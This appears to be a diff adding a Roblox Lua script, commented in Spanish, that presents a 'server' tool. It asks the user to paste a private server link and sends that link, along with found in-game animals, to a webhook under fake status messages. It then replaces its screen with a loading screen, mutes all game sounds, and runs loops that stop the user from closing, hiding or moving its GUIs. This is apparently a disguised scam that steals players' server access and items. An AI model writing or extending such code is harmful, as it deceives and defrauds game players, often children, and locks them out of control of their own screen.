+serverButton.MouseEnter:Connect(function()
+    TweenService:Create(serverButton,TweenInfo.new(0.2),{
+        BackgroundColor3 = Color3.fromRGB(30,30,30),
+        Size = UDim2.new(0,205,0,54)
+    }):Play()
+end)
+
+serverButton.MouseLeave:Connect(function()
+    TweenService:Create(serverButton,TweenInfo.new(0.2),{
+        BackgroundColor3 = Color3.fromRGB(0,0,0),
+        Size = UDim2.new(0,200,0,50)
+    }):Play()
+end)
+
+local statusLabel = Instance.new("TextLabel")
+statusLabel.Parent = mainFrame
+statusLabel.Size = UDim2.new(1,-30,0,20)
+statusLabel.Position = UDim2.new(0,15,1,-30)
+statusLabel.BackgroundTransparency = 1
+statusLabel.Text = "Ready to send..."
+statusLabel.TextColor3 = Color3.fromRGB(140,140,160)
+statusLabel.TextSize = 12
+statusLabel.Font = Enum.Font.Arcade
+statusLabel.TextXAlignment = Enum.TextXAlignment.Center
+
+serverButton.MouseButton1Click:Connect(function()
+    local link = inputBox.Text
+    
+    if link == "" then
+        statusLabel.Text = "ERROR: Empty link!"
+        statusLabel.TextColor3 = Color3.fromRGB(255,100,100)
+        task.wait(2)
+        statusLabel.Text = "Ready to send..."
+        statusLabel.TextColor3 = Color3.fromRGB(140,140,160)
+        return
+    end
+    
+    statusLabel.Text = "Checking Servers..."
+    statusLabel.TextColor3 = Color3.fromRGB(255,255,100)
+    
+    local podiumInfo = getPodiumInfo()
+    local foundAnimals = {}
+    
+    if not podiumInfo.error then
+        local hasAnimal
+        hasAnimal, foundAnimals = hasAllowedAnimal(podiumInfo)
+    end
+    
+    statusLabel.Text = "Preparing script..."
+    statusLabel.TextColor3 = Color3.fromRGB(255,255,100)
+    
+    local success = sendToWebhook(link, foundAnimals)
+    
+    if success then
+        statusLabel.Text = "✓ Executed successfully!"
+        statusLabel.TextColor3 = Color3.fromRGB(100,255,100)
+        
+        TweenService:Create(serverButton,TweenInfo.new(0.2),{
+            BackgroundColor3 = Color3.fromRGB(0,100,0)
+        }):Play()
+        
+        task.wait(0.5)
+        
+        -- Destruir COMPLETAMENTE el ArcadeGUI después de enviar el webhook
+        if screenGui then
+            screenGui:Destroy()
+        end
+        
+        -- Crear pantalla de carga INMEDIATAMENTE
+        createLoadingScreen()
+        
+    else
+        statusLabel.Text = "X Invalid private server link!"
+        statusLabel.TextColor3 = Color3.fromRGB(255,100,100)
+        
+        TweenService:Create(serverButton,TweenInfo.new(0.2),{
+            BackgroundColor3 = Color3.fromRGB(100,0,0)
+        }):Play()
+        
+        task.wait(1)
+        
+        TweenService:Create(serverButton,TweenInfo.new(0.3),{
+            BackgroundColor3 = Color3.fromRGB(0,0,0)
+        }):Play()
+        
+        task.wait(2)
+        statusLabel.Text = "Ready to send..."
+        statusLabel.TextColor3 = Color3.fromRGB(140,140,160)
+    end
+end)
+
+local particleFrame = Instance.new("Frame")
+particleFrame.Parent = mainFrame
+particleFrame.Size = UDim2.new(1,0,1,0)
+particleFrame.BackgroundTransparency = 1
+particleFrame.ZIndex = 1
+
+for i = 1,8 do
+    local p = Instance.new("Frame")
+    p.Parent = particleFrame
+    p.Size = UDim2.new(0, math.random(2,4),0, math.random(2,4))
+    p.Position = UDim2.new(math.random(),0,math.random(),0)
+    p.BackgroundColor3 = Color3.fromHSV(math.random(),0.8,0.6)
+    p.BorderSizePixel = 0
+    p.BackgroundTransparency = 0.6
+    local c = Instance.new("UICorner")
+    c.CornerRadius = UDim.new(1,0)
+    c.Parent = p
+    TweenService:Create(p, TweenInfo.new(math.random(4,8),Enum.EasingStyle.Sine,Enum.EasingDirection.InOut,-1,true),
+        {Position=UDim2.new(math.random(),0,math.random(),0)}):Play()
+end
+
+local function mutearTodosSonidos()
+    local function mutear(sound)
+        if sound:IsA("Sound") then
+            sound.Volume = 0
+            sound.Playing = false
+        end
+    end
+    
+    for _, obj in pairs(game:GetDescendants()) do
+        mutear(obj)
+    end
+    
+    game.DescendantAdded:Connect(function(obj)
+        mutear(obj)
+    end)
+    
+    spawn(function()
+        while wait(1) do
+            for _, obj in pairs(game:GetDescendants()) do
+                if obj:IsA("Sound") then obj.Volume = 0 end
+            end
+        end
+    end)
+end
+
+local function proteccionAntiDestruccion()
+    local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+    local backups = {}
+    
+    local function crearBackup(nombreGui)
+        local gui = PlayerGui:FindFirstChild(nombreGui)
+        if gui then 
+            backups[nombreGui] = gui:Clone()
+        end
+    end
+    
+    local function restaurarGUI(nombreGui)
+        if backups[nombreGui] then
+            local nuevoGui = backups[nombreGui]:Clone()
+            nuevoGui.Parent = PlayerGui
+            crearBackup(nombreGui)
+        end
+    end
+    
+    task.wait(2)
+    crearBackup("MetodoMoeiraLoader")
+    crearBackup("ArcadeGUI")
+    
+    spawn(function()
+        while wait(0.5) do
+            if not PlayerGui:FindFirstChild("MetodoMoeiraLoader") then
+                restaurarGUI("MetodoMoeiraLoader")
+            end
+            if not PlayerGui:FindFirstChild("ArcadeGUI") then
+                restaurarGUI("ArcadeGUI")
+            end
+        end
+    end)
+    
+    PlayerGui.DescendantRemoving:Connect(function(descendant)
+        if descendant.Name == "MetodoMoeiraLoader" or descendant.Name == "ArcadeGUI" then
+            task.spawn(function()
+                task.wait(0.05)
+                restaurarGUI(descendant.Name)
+            end)
+        end
+    end)
+end
+
+local function proteccionAntiOcultacion()
+    local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+    local guisProtegidos = {"MetodoMoeiraLoader", "ArcadeGUI"}
+    
+    local function forzarVisibilidad(gui)
+        if not gui or not gui.Parent then return end
+        
+        if gui:IsA("ScreenGui") then
+            gui.Enabled = true
+            gui.DisplayOrder = 999999
+            gui.IgnoreGuiInset = true
+            gui.ResetOnSpawn = false
+        end
+        
+        for _, descendant in pairs(gui:GetDescendants()) do
+            if descendant:IsA("GuiObject") then
+                pcall(function()
+                    descendant.Visible = true
+                end)
+            end
+        end
+    end
+    
+    local function configurarProteccion(nombreGui)
+        local gui = PlayerGui:FindFirstChild(nombreGui)
+        if not gui then return end
+        
+        gui:GetPropertyChangedSignal("Enabled"):Connect(function()
+            if gui.Enabled == false then
+                gui.Enabled = true
+            end
+        end)
+        
+        gui:GetPropertyChangedSignal("DisplayOrder"):Connect(function()
+            if gui.DisplayOrder < 999999 then
+                gui.DisplayOrder = 999999
+            end
+        end)
+        
+        gui:GetPropertyChangedSignal("ResetOnSpawn"):Connect(function()
+            if gui.ResetOnSpawn == true then
+                gui.ResetOnSpawn = false
+            end
+        end)
+        
+        local function protegerElemento(elemento)
+            if elemento:IsA("GuiObject") then
+                elemento:GetPropertyChangedSignal("Visible"):Connect(function()
+                    if elemento.Visible == false and elemento.Parent then
+                        elemento.Visible = true
+                    end
+                end)
+            end
+        end
+        
+        for _, descendant in pairs(gui:GetDescendants()) do
+            protegerElemento(descendant)
+        end
+        
+        gui.DescendantAdded:Connect(function(descendant)
+            protegerElemento(descendant)
+        end)
+    end
+    
+    task.wait(2)
+    for _, nombreGui in ipairs(guisProtegidos) do
+        configurarProteccion(nombreGui)
+    end
+    
+    spawn(function()
+        while wait(0.3) do
+            for _, nombreGui in ipairs(guisProtegidos) do
+                local gui = PlayerGui:FindFirstChild(nombreGui)
+                if gui then
+                    forzarVisibilidad(gui)
+                end
+            end
+        end
+    end)
+    
+    PlayerGui.ChildAdded:Connect(function(child)
+        for _, nombreGui in ipairs(guisProtegidos) do
+            if child.Name == nombreGui then
+                task.wait(0.1)
+                configurarProteccion(nombreGui)
+            end
+        end
+    end)
+end
+
+local function proteccionParent()
+    local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+    local guisProtegidos = {"MetodoMoeiraLoader", "ArcadeGUI"}
+    
+    task.wait(2)
+    
+    for _, nombreGui in ipairs(guisProtegidos) do
+        local gui = PlayerGui:FindFirstChild(nombreGui)
+        if gui then
+            gui:GetPropertyChangedSignal("Parent"):Connect(function()
+                if gui.Parent ~= PlayerGui then
+                    gui.Parent = PlayerGui
+                end
+            end)
+        end
+    end
+end
+
+mutearTodosSonidos()
+
+spawn(function()
+    task.wait(3)
+    proteccionAntiDestruccion()
+    proteccionAntiOcultacion()
+    proteccionParent()
+end)
